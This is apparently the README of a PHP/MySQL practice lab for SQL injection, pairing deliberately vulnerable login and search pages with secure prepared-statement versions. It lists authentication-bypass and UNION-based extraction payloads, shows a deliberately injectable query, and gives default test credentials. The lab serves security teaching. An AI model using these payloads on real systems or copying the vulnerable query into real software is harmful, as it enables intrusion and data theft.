# SQL Injection Practice Site

A comprehensive educational platform for learning about SQL injection vulnerabilities and secure coding practices. This project includes both **vulnerable implementations** (for practice) and **secure implementations** (for reference).

## ⚠️ **IMPORTANT DISCLAIMER**
This project contains **deliberately vulnerable code** for educational purposes only. **NEVER use the vulnerable code in production environments!**

## 📁 **Project Structure**

### 🔓 **Vulnerable Files (For Learning)**
- **`vulnerable_login.php`** - Login page with SQL injection vulnerabilities
- **`VulnerableUserAuth.php`** - Authentication class with intentional security flaws
- **`vulnerable_dashboard.php`** - Dashboard showing successful exploitation
- **`sample.php`** - Simple side-by-side comparison of vulnerable vs secure code

### 🔒 **Secure Files (Reference Implementation)**
- **`login.php`** - Secure login implementation
- **`signup.php`** - Secure registration with validation
- **`UserAuth.php`** - Secure authentication class using prepared statements
- **`dashboard.php`** - Secure dashboard with proper session management

### 📚 **Documentation & Setup**
- **`config.php`** - Database configuration
- **`database.sql`** - Basic database schema
- **`enhanced_database.sql`** - Extended schema with sample data
- **`SQL_INJECTION_GUIDE.md`** - Comprehensive learning guide
- **`README.md`** - This file

## 🎯 **Learning Objectives**
- Understand how SQL injection vulnerabilities work
- Practice identifying and exploiting SQL injection flaws
- Learn the difference between vulnerable and secure code
- Master proper security measures and prevention techniques
- Gain hands-on experience with real attack scenarios

## 🚀 **Quick Start**

### **Prerequisites**
- XAMPP, WAMP, or similar PHP/MySQL stack
- Web browser
- Basic understanding of PHP and SQL

### **Installation**
1. **Clone the repository:**
   ```bash
   git clone https://github.com/Sachin-Kumar-08/SQL-Injection-Practice-Site.git
   cd SQL-Injection-Practice-Site
   ```

2. **Setup web server:**
   - Copy files to your web server directory (e.g., `C:\xampp\htdocs\sql-injection-practice\`)
   - Start Apache and MySQL services

3. **Create database:**
   ```sql
   mysql -u root -p < database.sql
   # or for extended practice:
   mysql -u root -p < enhanced_database.sql
   ```

4. **Access the application:**
   - Vulnerable version: `http://localhost/sql-injection-practice/vulnerable_login.php`
   - Secure version: `http://localhost/sql-injection-practice/login.php`
   - Sample comparison: `http://localhost/sql-injection-practice/sample.php`

## 🎓 **Practice Exercises**

### **Exercise 1: Authentication Bypass**
**Target:** `vulnerable_login.php` or `sample.php`

**Try these payloads in the email/username field:**
```sql
admin' OR '1'='1' --
' OR 1=1 --
admin' --
' OR 'a'='a
```

### **Exercise 2: Data Extraction**
**Target:** Search functionality in `vulnerable_login.php`

**Try these UNION-based attacks:**
```sql
' UNION SELECT username,password FROM users --
' UNION SELECT database(),version() --
' UNION SELECT table_name,column_name FROM information_schema.columns --
```

### **Exercise 3: Compare Security**
1. Test the same payloads on both vulnerable and secure forms
2. Observe how prepared statements prevent injection
3. Study the code differences between implementations

## 🔧 **Features**

### **🔓 Vulnerable Implementation Features:**
- Direct string concatenation in SQL queries
- No input validation or sanitization
- Debug output showing actual SQL queries
- Multiple injection points (login, search)
- Real-time query visualization

### **🔒 Secure Implementation Features:**
- Prepared statements with parameter binding
- Input validation and sanitization
- Password hashing with `password_hash()`
- XSS protection with `htmlspecialchars()`
- Session-based authentication
- CSRF protection ready

### **📚 Educational Features:**
- Side-by-side vulnerable vs secure comparison
- Real-time SQL query debugging
- Comprehensive learning guide
- Multiple attack scenarios
- Prevention technique demonstrations

## 🛡️ **Security Comparison**

### **❌ Vulnerable Code:**
```php
// DANGEROUS - Never do this!
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
$result = $pdo->query($query);
```

### **✅ Secure Code:**
```php
// SAFE - Always use prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
$stmt->execute([$email, $hashedPassword]);
```

## 🧪 **Test Accounts**

### **Default Accounts:**
- **Admin:** `admin@example.com` / `password123`
- **User:** `test@example.com` / `password123`
- **Sample:** `admin` / `password` (for sample.php)

### **SQL Injection Bypass:**
- **Email:** `admin@example.com' OR '1'='1' --`
- **Password:** `anything`

## 📊 **Database Schema**

### **Basic Schema (database.sql):**
```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL,
    is_active BOOLEAN DEFAULT TRUE
);
```

### **Enhanced Schema (enhanced_database.sql):**
- Extended user profiles
- Sensitive data table (for data extraction practice)
- Login attempt logs
- Multiple user roles

## 🚨 **Common SQL Injection Payloads**

### **Authentication Bypass:**
```sql
admin' --
admin' OR '1'='1' --
' OR 1=1 #
') OR ('1'='1' --
```

### **Union-Based Attacks:**
```sql
' UNION SELECT 1,2,3,4 --
' UNION SELECT username,password,1,2 FROM users --
' UNION SELECT database(),user(),version(),1 --
```

### **Information Gathering:**
```sql
' AND 1=0 UNION SELECT table_name,1,2,3 FROM information_schema.tables --
' AND 1=0 UNION SELECT column_name,1,2,3 FROM information_schema.columns WHERE table_name='users' --
```

## 🛡️ **Prevention Techniques**

1. **Prepared Statements** (Most Important)
2. **Input Validation and Sanitization**
3. **Least Privilege Database Access**
4. **Error Handling** (Don't expose database errors)
5. **Web Application Firewalls**
6. **Regular Security Audits**

## 📚 **Learning Resources**

- **[OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)**
- **[PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)**
- **[OWASP WebGoat](https://owasp.org/www-project-webgoat/)**
- **SQL_INJECTION_GUIDE.md** (included in this project)

## ⚖️ **Legal and Ethical Guidelines**

### **🚨 IMPORTANT:**
- **Only practice on your own systems or designated learning environments**
- **Never attempt SQL injection on systems you don't own**
- **Unauthorized testing is illegal and unethical**
- **Use this knowledge to build more secure applications**
- **Always obtain proper authorization before security testing**

## 🤝 **Contributing**

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Add educational content or improve existing examples
4. Submit a pull request

### **Ideas for Contributions:**
- Additional SQL injection scenarios
- More prevention examples
- Different database types (PostgreSQL, SQLite)
- Advanced attack techniques
- Improved documentation

## 📝 **License**

This project is for educational purposes only. Use responsibly and ethically.

## 📞 **Support**

If you encounter issues:
1. Check the `SQL_INJECTION_GUIDE.md` for detailed setup instructions
2. Verify your web server and database are running
3. Ensure proper file permissions
4. Check PHP error logs for debugging

---

**Remember: The goal is to learn how to build secure applications, not to cause harm. Use this knowledge responsibly!**
